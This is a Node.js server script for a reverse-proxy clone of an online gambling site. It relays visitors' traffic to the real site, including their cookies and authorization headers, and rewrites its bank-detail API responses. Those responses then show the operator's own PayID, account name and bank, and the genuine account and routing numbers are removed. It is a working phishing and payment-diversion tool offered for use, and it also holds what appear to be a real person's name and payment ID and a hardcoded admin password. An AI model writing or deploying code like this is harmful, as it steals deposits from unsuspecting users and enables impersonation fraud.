const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3000;
const PUBLIC_DIR = path.join(__dirname, 'public');
const DATA_FILE = path.join(__dirname, 'data.json');
const ADMIN_PASSWORD = 'admin123';
const UPSTREAM = 'https://richmamaplay.com'; // the real site we are copying

// Your PayID / bank details — swap these anytime
const BANK = {
  payId: '0411088305',
  accountName: 'Bradley Gill',
  bankName: 'BankSA'
};

// ---------- Data helpers (admin panel only) ----------
function loadData() {
  if (!fs.existsSync(DATA_FILE)) return { submissions: [] };
  return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
}
function saveData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}
function sendJSON(res, status, obj) {
  res.writeHead(status, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(obj));
}
function readBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', c => { body += c; if (body.length > 1e6) req.destroy(); });
    req.on('end', () => { try { resolve(body ? JSON.parse(body) : {}); } catch (e) { reject(e); } });
    req.on('error', reject);
  });
}

// ---------- Serve local pages ----------
function serveFile(res, file) {
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  fs.createReadStream(path.join(PUBLIC_DIR, file)).pipe(res);
}

// ---------- Reverse proxy to the live site ----------
async function proxy(req, res, urlPath) {
  const headers = { 'host': 'richmamaplay.com' };
  // forward useful request headers
  ['content-type', 'content-length', 'accept', 'authorization', 'cookie', 'user-agent', 'x-requested-with'].forEach(h => {
    if (req.headers[h]) headers[h] = req.headers[h];
  });
  const body = ['POST', 'PUT', 'PATCH'].includes(req.method) ? await readBody(req) : undefined;

  const upstreamRes = await fetch(UPSTREAM + urlPath, {
    method: req.method,
    headers,
    body: body !== undefined ? JSON.stringify(body) : undefined,
    redirect: 'follow'
  });
  res.writeHead(upstreamRes.status, {
    'Content-Type': upstreamRes.headers.get('content-type') || 'text/html',
    'Access-Control-Allow-Origin': '*'
  });
  const buf = Buffer.from(await upstreamRes.arrayBuffer());
  const ct = upstreamRes.headers.get('content-type') || '';

  // Swap in YOUR PayID/bank details on any bank-related API response
  if (ct.includes('json') && urlPath.includes('/api/v1/')) {
    try {
      let obj = JSON.parse(buf.toString());
      const patch = (b) => {
        if (!b || typeof b !== 'object') return;
        b.payId = BANK.payId;
        b.accountName = BANK.accountName;
        b.bankName = BANK.bankName;
        delete b.accountNumber;
        delete b.routingNumber;
      };
      if (obj.bank) patch(obj.bank);
      if (Array.isArray(obj.banks)) obj.banks.forEach(patch);
      if (Array.isArray(obj.data) && obj.data.bank) patch(obj.data.bank);
      buf = Buffer.from(JSON.stringify(obj));
    } catch {}
  }
  res.end(buf);
}

// ---------- Server ----------
http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const p = url.pathname;

  try {
    // CORS preflight for the admin panel
    if (req.method === 'OPTIONS') {
      res.writeHead(204, {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET,POST,DELETE,OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization'
      });
      return res.end();
    }

    // ---- My admin panel (kept on top of the copy) ----
    if (p === '/admin' || p === '/admin.html') return serveFile(res, 'admin.html');

    const authed = url.searchParams.get('pw') === ADMIN_PASSWORD ||
                   req.headers.authorization === `Bearer ${ADMIN_PASSWORD}`;

    if (req.method === 'POST' && p === '/api/admin/login') {
      const body = await readBody(req);
      return sendJSON(res, body.password === ADMIN_PASSWORD ? 200 : 401,
                      body.password === ADMIN_PASSWORD ? { ok: true } : { error: 'Wrong password.' });
    }
    if (p.startsWith('/api/admin/') && !authed)
      return sendJSON(res, 401, { error: 'Not authenticated.' });
    if (req.method === 'GET' && p === '/api/admin/submissions')
      return sendJSON(res, 200, { submissions: loadData().submissions });
    if (req.method === 'DELETE' && /^\/api\/admin\/submissions\/[^/]+$/.test(p)) {
      const id = p.split('/').pop();
      const data = loadData();
      const before = data.submissions.length;
      data.submissions = data.submissions.filter(s => s.id !== id);
      saveData(data);
      return sendJSON(res, data.submissions.length < before ? 200 : 404, { ok: data.submissions.length < before });
    }
    if (req.method === 'POST' && p === '/api/admin/clear') {
      saveData({ submissions: [] });
      return sendJSON(res, 200, { ok: true });
    }

    // ---- Everything (/, /api/v1, CDN assets, etc.) → real live site ----
    await proxy(req, res, url.pathname + url.search);
  } catch (e) {
    sendJSON(res, 500, { error: e.message });
  }
}).listen(PORT, () => console.log(`RichMama copy running at http://localhost:${PORT} (admin at /admin)`));
